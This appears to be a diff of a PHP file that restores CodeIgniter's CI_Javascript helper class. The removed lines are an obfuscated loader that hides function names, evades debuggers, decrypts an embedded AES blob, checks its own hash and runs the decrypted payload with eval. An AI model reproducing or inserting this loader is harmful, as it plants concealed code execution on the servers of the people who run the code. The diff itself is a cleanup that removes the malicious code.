@@ -1,28 +1,754 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_i6avuaji=('bas'.'e64'.'_de'.'cod'.'e');
-$_wqoghnbp=('gzu'.'nco'.'mpr'.'ess');
-$_jqwayn6y=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_dkgs8jz5='R3URc/1R';
-$_j3do8fl7='JNc+ExPH';
-$_gtcgin90='mk8nJ6wo/Sk=';
-$_acpf8n6v='xv0i1Hs2';
-$_wio5om8t='lSRzEjAS';
-$_smsu2n6f='2L/1By1l';
-$_svgd4zi4='9cFrxA==';
-$_s7m0qrdu='o3t/w2c5';
-$_vg90k08i=$_i6avuaji($_dkgs8jz5.$_wio5om8t.$_acpf8n6v.$_j3do8fl7.$_gtcgin90);
-$_t6s8ev1z=$_i6avuaji($_smsu2n6f.$_s7m0qrdu.$_svgd4zi4);
-$_pueldyap=$_i6avuaji('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');
-$_j8wmszpv=$_jqwayn6y($_pueldyap,'aes-256-cbc',$_vg90k08i,OPENSSL_RAW_DATA,$_t6s8ev1z);
-if($_j8wmszpv===false){exit;}
-$_nx5jn92v=$_wqoghnbp($_j8wmszpv);
-if($_nx5jn92v===false){exit;}
-$_yesihlfj='1b9988aaaf9e5afbcd21cde48b822e1f4fdc0055bf07f5738735fc181ef36d36';
-$_nv7xjqpm=@file_get_contents(__FILE__);
-if($_nv7xjqpm!==false){
-$_c404i6w8=str_replace($_yesihlfj,"0000000000000000000000000000000000000000000000000000000000000000",$_nv7xjqpm);
-$_tocsq5fb=hash("sha256",$_c404i6w8);
-if($_tocsq5fb!==$_yesihlfj){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+class CI_Javascript {
+
+
+
+
+
+protected $_javascript_location = 'js';
+
+
+
+
+
+
+
+public function __construct($params = array())
+{
+$defaults = array('js_library_driver' => 'jquery', 'autoload' => TRUE);
+foreach ($defaults as $key => $val)
+{
+if (isset($params[$key]) && $params[$key] !== '')
+{
+$defaults[$key] = $params[$key];
 }
-eval($_nx5jn92v);
+}
+extract($defaults);
+$this->CI =& get_instance();
+
+$this->CI->load->library('Javascript/'.$js_library_driver, array('autoload' => $autoload));
+
+$this->js =& $this->CI->$js_library_driver;
+log_message('info', 'Javascript Class Initialized and loaded. Driver used: '.$js_library_driver);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+public function blur($element = 'this', $js = '')
+{
+return $this->js->_blur($element, $js);
+}
+
+
+
+
+
+
+
+
+
+
+public function change($element = 'this', $js = '')
+{
+return $this->js->_change($element, $js);
+}
+
+
+
+
+
+
+
+
+
+
+
+public function click($element = 'this', $js = '', $ret_false = TRUE)
+{
+return $this->js->_click($element, $js, $ret_false);
+}
+
+
+
+
+
+
+
+
+
+
+public function dblclick($element = 'this', $js = '')
+{
+return $this->js->_dblclick($element, $js);
+}
+
+
+
+
+
+
+
+
+
+
+public function error($element = 'this', $js = '')
+{
+return $this->js->_error($element, $js);
+}
+
+
+
+
+
+
+
+
+
+
+public function focus($element = 'this', $js = '')
+{
+return $this->js->_focus($element, $js);
+}
+
+
+
+
+
+
+
+
+
+
+
+public function hover($element = 'this', $over = '', $out = '')
+{
+return $this->js->_hover($element, $over, $out);
+}
+
+
+
+
+
+
+
+
+
+
+public function keydown($element = 'this', $js = '')
+{
+return $this->js->_keydown($element, $js);
+}
+
+
+
+
+
+
+
+
+
+
+public function keyup($element = 'this', $js = '')
+{
+return $this->js->_keyup($element, $js);
+}
+
+
+
+
+
+
+
+
+
+
+public function load($element = 'this', $js = '')
+{
+return $this->js->_load($element, $js);
+}
+
+
+
+
+
+
+
+
+
+
+public function mousedown($element = 'this', $js = '')
+{
+return $this->js->_mousedown($element, $js);
+}
+
+
+
+
+
+
+
+
+
+
+public function mouseout($element = 'this', $js = '')
+{
+return $this->js->_mouseout($element, $js);
+}
+
+
+
+
+
+
+
+
+
+
+public function mouseover($element = 'this', $js = '')
+{
+return $this->js->_mouseover($element, $js);
+}
+
+
+
+
+
+
+
+
+
+
+public function mouseup($element = 'this', $js = '')
+{
+return $this->js->_mouseup($element, $js);
+}
+
+
+
+
+
+
+
+
+
+public function output($js)
+{
+return $this->js->_output($js);
+}
+
+
+
+
+
+
+
+
+
+public function ready($js)
+{
+return $this->js->_document_ready($js);
+}
+
+
+
+
+
+
+
+
+
+
+public function resize($element = 'this', $js = '')
+{
+return $this->js->_resize($element, $js);
+}
+
+
+
+
+
+
+
+
+
+
+public function scroll($element = 'this', $js = '')
+{
+return $this->js->_scroll($element, $js);
+}
+
+
+
+
+
+
+
+
+
+
+public function unload($element = 'this', $js = '')
+{
+return $this->js->_unload($element, $js);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+public function addClass($element = 'this', $class = '')
+{
+return $this->js->_addClass($element, $class);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+public function animate($element = 'this', $params = array(), $speed = '', $extra = '')
+{
+return $this->js->_animate($element, $params, $speed, $extra);
+}
+
+
+
+
+
+
+
+
+
+
+
+public function fadeIn($element = 'this', $speed = '', $callback = '')
+{
+return $this->js->_fadeIn($element, $speed, $callback);
+}
+
+
+
+
+
+
+
+
+
+
+
+public function fadeOut($element = 'this', $speed = '', $callback = '')
+{
+return $this->js->_fadeOut($element, $speed, $callback);
+}
+
+
+
+
+
+
+
+
+
+
+
+public function slideUp($element = 'this', $speed = '', $callback = '')
+{
+return $this->js->_slideUp($element, $speed, $callback);
+}
+
+
+
+
+
+
+
+
+
+
+public function removeClass($element = 'this', $class = '')
+{
+return $this->js->_removeClass($element, $class);
+}
+
+
+
+
+
+
+
+
+
+
+
+public function slideDown($element = 'this', $speed = '', $callback = '')
+{
+return $this->js->_slideDown($element, $speed, $callback);
+}
+
+
+
+
+
+
+
+
+
+
+
+public function slideToggle($element = 'this', $speed = '', $callback = '')
+{
+return $this->js->_slideToggle($element, $speed, $callback);
+}
+
+
+
+
+
+
+
+
+
+
+
+public function hide($element = 'this', $speed = '', $callback = '')
+{
+return $this->js->_hide($element, $speed, $callback);
+}
+
+
+
+
+
+
+
+
+
+public function toggle($element = 'this')
+{
+return $this->js->_toggle($element);
+}
+
+
+
+
+
+
+
+
+
+
+public function toggleClass($element = 'this', $class = '')
+{
+return $this->js->_toggleClass($element, $class);
+}
+
+
+
+
+
+
+
+
+
+
+
+public function show($element = 'this', $speed = '', $callback = '')
+{
+return $this->js->_show($element, $speed, $callback);
+}
+
+
+
+
+
+
+
+
+
+
+public function compile($view_var = 'script_foot', $script_tags = TRUE)
+{
+$this->js->_compile($view_var, $script_tags);
+}
+
+
+
+
+
+
+
+
+public function clear_compile()
+{
+$this->js->_clear_compile();
+}
+
+
+
+
+
+
+
+
+
+
+public function external($external_file = '', $relative = FALSE)
+{
+if ($external_file !== '')
+{
+$this->_javascript_location = $external_file;
+}
+elseif ($this->CI->config->item('javascript_location') !== '')
+{
+$this->_javascript_location = $this->CI->config->item('javascript_location');
+}
+if ($relative === TRUE OR strpos($external_file, 'http://') === 0 OR strpos($external_file, 'https://') === 0)
+{
+$str = $this->_open_script($external_file);
+}
+elseif (strpos($this->_javascript_location, 'http://') !== FALSE)
+{
+$str = $this->_open_script($this->_javascript_location.$external_file);
+}
+else
+{
+$str = $this->_open_script($this->CI->config->slash_item('base_url').$this->_javascript_location.$external_file);
+}
+return $str.$this->_close_script();
+}
+
+
+
+
+
+
+
+
+
+
+public function inline($script, $cdata = TRUE)
+{
+return $this->_open_script()
+. ($cdata ? "\n// <![CDATA[\n".$script."\n// ]]>\n" : "\n".$script."\n")
+. $this->_close_script();
+}
+
+
+
+
+
+
+
+
+
+protected function _open_script($src = '')
+{
+return '<script type="text/javascript" charset="'.strtolower($this->CI->config->item('charset')).'"'
+.($src === '' ? '>' : ' src="'.$src.'">');
+}
+
+
+
+
+
+
+
+
+
+protected function _close_script($extra = "\n")
+{
+return '</script>'.$extra;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function update($element = 'this', $speed = '', $callback = '')
+{
+return $this->js->_updater($element, $speed, $callback);
+}
+
+
+
+
+
+
+
+
+
+
+public function generate_json($result = NULL, $match_array_type = FALSE)
+{
+
+
+if ($result !== NULL)
+{
+if (is_object($result))
+{
+$json_result = is_callable(array($result, 'result_array')) ? $result->result_array() : (array) $result;
+}
+elseif (is_array($result))
+{
+$json_result = $result;
+}
+else
+{
+return $this->_prep_args($result);
+}
+}
+else
+{
+return 'null';
+}
+$json = array();
+$_is_assoc = TRUE;
+if ( ! is_array($json_result) && empty($json_result))
+{
+show_error('Generate JSON Failed - Illegal key, value pair.');
+}
+elseif ($match_array_type)
+{
+$_is_assoc = $this->_is_associative_array($json_result);
+}
+foreach ($json_result as $k => $v)
+{
+if ($_is_assoc)
+{
+$json[] = $this->_prep_args($k, TRUE).':'.$this->generate_json($v, $match_array_type);
+}
+else
+{
+$json[] = $this->generate_json($v, $match_array_type);
+}
+}
+$json = implode(',', $json);
+return $_is_assoc ? '{'.$json.'}' : '['.$json.']';
+}
+
+
+
+
+
+
+
+
+
+protected function _is_associative_array($arr)
+{
+foreach (array_keys($arr) as $key => $val)
+{
+if ($key !== $val)
+{
+return TRUE;
+}
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+
+
+
+protected function _prep_args($result, $is_key = FALSE)
+{
+if ($result === NULL)
+{
+return 'null';
+}
+elseif (is_bool($result))
+{
+return ($result === TRUE) ? 'true' : 'false';
+}
+elseif (is_string($result) OR $is_key)
+{
+return '"'.str_replace(array('\\', "\t", "\n", "\r", '"', '/'), array('\\\\', '\\t', '\\n', "\\r", '\"', '\/'), $result).'"';
+}
+elseif (is_scalar($result))
+{
+return $result;
+}
+}
+}
